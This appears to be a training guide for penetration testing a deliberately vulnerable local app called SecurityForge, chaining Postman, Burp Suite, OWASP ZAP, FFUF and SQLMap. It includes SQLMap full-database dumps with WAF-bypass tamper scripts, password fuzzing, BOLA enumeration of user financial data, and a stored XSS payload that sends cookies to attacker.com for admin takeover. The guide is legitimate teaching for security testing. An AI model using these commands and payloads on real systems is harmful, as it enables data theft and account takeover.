# TOOLS INTEGRATION MASTER GUIDE

## 🛠️ COMPLETE TOOLKIT FOR SECURITYFORGE

Welcome to SecurityForge's comprehensive toolkit for modern penetration testing. This guide integrates **5 professional tools** for complete API and web vulnerability testing.

---

## 📊 TOOL COMPARISON MATRIX

| Tool | Purpose | Strengths | Best For |
|------|---------|-----------|----------|
| **Postman** | API Testing | Pre-built collections, automation, teamwork | API testing, integration, CI/CD |
| **Burp Suite** | Web Proxy | Interception, manual testing, reporting | Deep manual analysis, advanced exploitation |
| **OWASP ZAP** | Automated Scanning | Free, scriptable, baseline scans | Rapid assessment, CI/CD pipelines |
| **FFUF** | Fuzzing | Fast, recursive, flexible | Endpoint discovery, parameter fuzzing |
| **SQLMap** | SQL Exploitation | Automated, tamper scripts, WAF bypass | SQLi detection & extraction |

---

## 🎯 VULNERABILITY TESTING WORKFLOW

```
1. RECONNAISSANCE (FFUF)
   └─ Discover endpoints & parameters
   
2. AUTHENTICATION (Postman)
   └─ Test login flows, token generation
   
3. CRAWLING (OWASP ZAP)
   └─ Discover site structure, passive scanning
   
4. AGGRESSIVE SCANNING (OWASP ZAP)
   └─ Active scanning for vulnerabilities
   
5. MANUAL TESTING (Burp Suite)
   └─ Deep exploitation, business logic
   
6. PAYLOAD INJECTION (SQLMap, FFUF)
   └─ SQLi, XSS, command injection
   
7. AUTOMATION (Postman / Newman)
   └─ CI/CD integration, regression testing
   
8. REPORTING (All Tools)
   └─ Consolidate findings, generate reports
```

---

## 🔓 VULNERABILITY-SPECIFIC TOOL CHAINS

### **SQL Injection Testing**

**Quick Path:**
```
1. FFUF: Discover injection points
   $ ffuf -u "http://localhost:5000/api/search?q=FUZZ" -w sql_payloads.txt

2. SQLMap: Automate exploitation
   $ sqlmap -u "http://localhost:5000/api/search?q=test" --dbs --dump-all

3. Burp Suite: Manual verification & advanced exploitation
   └─ Use Repeater for UNION-based SQLi probing
```

**Deep Path:**
```
1. FFUF: Parameter discovery
2. Burp: Send to Repeater, test payloads
3. SQLMap: Tamper scripts for WAF bypass
4. Postman: Create test cases for automation
```

---

### **XSS Testing**

**Quick Path:**
```
1. OWASP ZAP: Automatic XSS detection
   └─ Passive scan will find reflected/stored XSS

2. Burp Suite: Manual confirmation
   └─ Use Intruder with XSS payload list

3. Postman: Create test assertions
```

**Stored XSS Chain:**
```
1. Postman: POST comment with XSS payload
   POST /api/comments
   {"comment": "<img src=x onerror=alert(1)>"}

2. Postman: GET comments, verify persistence
   GET /api/comments
   assert(response.contains("onerror="))

3. Burp: Browse dashboard, check if XSS fires
```

---

### **BOLA (Object Level Authorization)**

**Testing Approach:**
```
1. Postman: Extract user IDs from responses
   GET /api/users (admin endpoint)
   Save user_ids=[1,2,3,4,5]

2. FFUF: Enumerate accessible resources
   $ ffuf -u "http://localhost:5000/api/users/FUZZ/orders" -w user_ids.txt
   Filter: 200 responses = accessible without proper auth check

3. Burp Intruder: Systematic testing
   GET /api/users/§user_id§/sensitive-data
   Inject: 1-100
   Results show BOLA if non-owned data accessible
```

---

### **Authentication Testing**

**Complete Flow:**
```
1. Postman: Test valid login
   POST /api/auth/login
   Extract token

2. FFUF: Fuzz common passwords
   $ ffuf -u "http://localhost:5000/api/auth/login" \
     -X POST \
     -w passwords.txt

3. Postman: JWT token manipulation
   Decode token, modify payload (change user_id to admin)

4. SQLMap: Test auth endpoint for SQLi
   $ sqlmap -u "http://localhost:5000/api/auth/login" \
     --method POST \
     --data '{"username":"test","password":"test"}' \
     -p username --dbs
```

---

## 📋 STEP-BY-STEP PENTESTING PROCESS

### **Day 1: Reconnaissance & Discovery**

**Morning:**
```bash
# Step 1: Baseline with ZAP
zaproxy -cmd -quickurl http://localhost:5000/api \
  -quickout baseline.html

# Step 2: Discover endpoints with FFUF
ffuf -u http://localhost:5000/api/FUZZ \
  -w SecLists/Discovery/Web-Content/api/common-api-endpoints.txt \
  -o discovered_endpoints.json
```

**Afternoon:**
```bash
# Step 3: Test with Postman (authentication flow)
# Import SecurityForge_Postman_Collection.json
# Manually test each endpoint

# Step 4: Active scanning with ZAP
# Configure policies, run active scan on discovered endpoints
```

---

### **Day 2: Vulnerability Exploitation**

**Morning:**
```bash
# Step 1: SQLi Testing
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --dbs --tables --dump-all -v 1

# Step 2: XSS Payload Testing
ffuf -u "http://localhost:5000/api/comments?FUZZ=test" \
  -w xss_payloads.txt
```

**Afternoon:**
```bash
# Step 3: Manual Testing in Burp
# Use Intruder for BOLA on user endpoints
# Use Repeater for custom payloads

# Step 4: Create Postman test cases for all findings
# Automate re-testing with Newman
```

---

### **Day 3: Advanced Exploitation & Reporting**

**Morning:**
```bash
# Step 1: WAF bypass testing (if applicable)
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --tamper=space2comment,between \
  --dump-all

# Step 2: Business logic fuzzing
ffuf -u "http://localhost:5000/api/orders?FUZZ=value" \
  -w business_logic_params.txt
```

**Afternoon:**
```bash
# Step 3: Generate reports from all tools
# - OWASP ZAP: HTML report
# - SQLMap: JSON output
# - Postman: Newman HTML report
# - Burp: PDF report

# Step 4: Create consolidated report with findings
```

---

## 🎓 LEARNING PATHS

### **Beginner Path**
```
1. Start with Postman
   └─ Learn API basics, authentication
   
2. Add OWASP ZAP
   └─ Understand automated scanning
   
3. Study individual vulnerabilities
   └─ Use guides + tools for each one
```

### **Intermediate Path**
```
1. Master Postman + Burp Suite
   └─ Learn manual testing techniques
   
2. Understand SQLMap
   └─ SQLi testing & exploitation
   
3. Learn FFUF
   └─ Fuzzing & parameter discovery
```

### **Advanced Path**
```
1. Combine all 5 tools effectively
   └─ Know when to use which tool
   
2. Custom payload development
   └─ Create tool-specific wordlists
   
3. Automate with CI/CD
   └─ Newman, ZAP API, SQLMap batch
   
4. WAF Bypass techniques
   └─ Tamper scripts, encoding
```

---

## 🚀 AUTOMATION EXAMPLES

### **Automated Nightly Security Testing**

**GitHub Actions:**
```yaml
name: SecurityForge Nightly Tests

on:
  schedule:
    - cron: '0 2 * * *'  # 2 AM every night

jobs:
  security-tests:
    runs-on: ubuntu-latest
    services:
      app:
        image: securityforge:latest
        ports:
          - 5000:5000

    steps:
      - uses: actions/checkout@v2
      
      # 1. FFUF - Endpoint discovery
      - name: FFUF Endpoint Discovery
        run: |
          ffuf -u http://localhost:5000/api/FUZZ \
            -w endpoints.txt \
            -of json -o ffuf_results.json
      
      # 2. OWASP ZAP - Automated scanning
      - name: OWASP ZAP Scan
        uses: zaproxy/action-full-scan@v0.7.0
        with:
          target: 'http://localhost:5000/api'
          rules_file_name: '.zap/rules.tsv'
      
      # 3. Postman - API regression tests
      - name: Postman Tests
        run: |
          npm install -g newman
          newman run postman/SecurityForge_Collection.json \
            -e postman/SecurityForge_Environment.json \
            --reporters cli,html \
            --reporter-html-export postman_report.html
      
      # 4. Consolidate reports
      - name: Archive Results
        uses: actions/upload-artifact@v2
        with:
          name: security-reports
          path: |
            ffuf_results.json
            report_md.md
            postman_report.html
```

---

### **SQLi Testing Automation**

**Bash Script:**
```bash
#!/bin/bash

# sqlmap_automated.sh

targets=(
  "http://localhost:5000/api/search?q=test"
  "http://localhost:5000/api/users?id=1"
  "http://localhost:5000/api/products?filter=name"
)

for target in "${targets[@]}"; do
  echo "[*] Testing: $target"
  
  sqlmap -u "$target" \
    --tamper=space2comment,between \
    --level=3 \
    --risk=2 \
    --threads=5 \
    --batch \
    --dump-all \
    -o \
    --verbose=1
done

# Consolidate results
echo "[+] Test complete. Results in: ./sqlmap_output/"
```

---

## 📚 CURATED WORDLISTS FOR SECURITYFORGE

**Stored in `payloads/` directory:**

```
payloads/
├── sql_injection_payloads.txt
│   ├── Blind SQLi
│   ├── Time-based blind
│   ├── Error-based
│   └── UNION-based
│
├── xss_payloads.txt
│   ├── Basic XSS
│   ├── DOM-based
│   ├── Event handlers
│   └── WAF bypass
│
├── command_injection_payloads.txt
│   ├── Unix/Linux commands
│   ├── Windows commands
│   └── Blind command injection
│
├── xxe_payloads.txt
│   ├── File reading
│   ├── xxe-ssrf chains
│   └── Blind XXE
│
├── auth_payloads.txt
│   ├── Default credentials
│   ├── JWT manipulation
│   └── OAuth bypass
│
└── endpoints_wordlist.txt
    ├── Common API endpoints
    ├── Admin panels
    └── Hidden resources
```

---

## 🔗 QUICK REFERENCE - WHEN TO USE EACH TOOL

**Use POSTMAN when:**
- Testing API endpoints
- Need pre-build collections
- Want CI/CD integration
- Testing authentication flows

**Use BURP SUITE when:**
- Intercepting requests
- Deep manual testing
- Custom payload crafting
- Complex exploitation

**Use OWASP ZAP when:**
- Quick baseline scan
- Automated vulnerability detection
- No budget for commercial tools
- CI/CD automation

**Use FFUF when:**
- Endpoint discovery
- Parameter fuzzing
- Fast recursive scanning
- Wordlist-based testing

**Use SQLMAP when:**
- Detected possible SQLi
- Need database extraction
- Testing with different DB types
- WAF bypass needed

---

## 🎯 SUCCESSFUL EXPLOITATION EXAMPLES

### **Example 1: SQLi → Full Database Dump**

```bash
# Step 1: Identify parameter
ffuf -u "http://localhost:5000/api/FUZZ?q=test" -w params.txt
# Results: /api/search is vulnerable

# Step 2: Confirm SQLi
sqlmap -u "http://localhost:5000/api/search?q=test" --dbs
# SQLi detected: boolean-based blind

# Step 3: Extract everything
sqlmap -u "http://localhost:5000/api/search?q=test" \
  --dump-all \
  -D securityforge

# Result: All user emails, password hashes, orders, etc.
```

---

### **Example 2: BOLA → Data Exfiltration**

```bash
# Step 1: Authenticate with Postman
# Get auth token

# Step 2: Fuzz user IDs with FFUF
ffuf -u "http://localhost:5000/api/users/FUZZ/sensitive-data" \
  -w <(seq 1 1000) \
  -H "Authorization: Bearer TOKEN" \
  -mc 200

# Step 3: Burp Intruder for detailed analysis
# GET /api/users/§id§/bank-account
# Compare responses for different IDs

# Result: Access to arbitrary user's financial data
```

---

### **Example 3: Stored XSS → Admin Account Takeover**

```bash
# Step 1: Inject XSS via comment
curl -X POST http://localhost:5000/api/comments \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"comment":"<script>fetch(\"http://attacker.com/steal?cookie=\"+document.cookie)</script>"}'

# Step 2: Wait for admin to visit comments page
# Admin's session cookie sent to attacker server

# Step 3: Use stolen cookie
curl http://localhost:5000/api/admin/users \
  -H "Cookie: session_id=ADMIN_SESSION_ID"

# Result: Full admin access
```

---

## 📊 INDUSTRY-GRADE REPORTING

**After completing assessments, generate reports from:**

1. **OWASP ZAP** → HTML/PDF report
2. **Postman/Newman** → HTML test report
3. **SQLMap** → JSON/CSV data extractions
4. **Burp Suite** → Professional PDF report
5. **Custom Analysis** → Markdown summary

**Consolidated Report Should Include:**
- Executive Summary
- Vulnerability Severity Breakdown
- Technical Details for Each Finding
- Impact Assessment
- Remediation Recommendations
- Evidence (screenshots, requests/responses)
- Compliance Mapping (OWASP, CWE, CVSS)

---

## 🏆 MASTERY CHECKLIST

- [ ] Can use all 5 tools independently
- [ ] Understand when to use which tool
- [ ] Can chain tools for complex exploitation
- [ ] Know major wordlists and when to use them
- [ ] Can interpret tool outputs
- [ ] Can generate professional reports
- [ ] Can automate testing via CI/CD
- [ ] Understand tamper scripts for WAF bypass
- [ ] Can exploit multiple vulnerabilities end-to-end
- [ ] Can teach others to use these tools

---

## 📚 INDIVIDUAL TOOL GUIDES

See detailed guides for each tool:
- 📖 [POSTMAN_GUIDE.md](POSTMAN_GUIDE.md) - API testing with collections
- 🔍 [BURP_SUITE_GUIDE.md](BURP_SUITE_GUIDE.md) - Browser-based manual testing
- 🔓 [OWASP_ZAP_GUIDE.md](OWASP_ZAP_GUIDE.md) - Automated security scanning
- 🎯 [FFUF_GUIDE.md](FFUF_GUIDE.md) - Fast endpoint/parameter fuzzing
- 💉 [SQLMAP_GUIDE.md](SQLMAP_GUIDE.md) - Automated SQL injection testing

---

**Master Security Testing. Become a Top Penetration Tester. Use SecurityForge.** 🚀

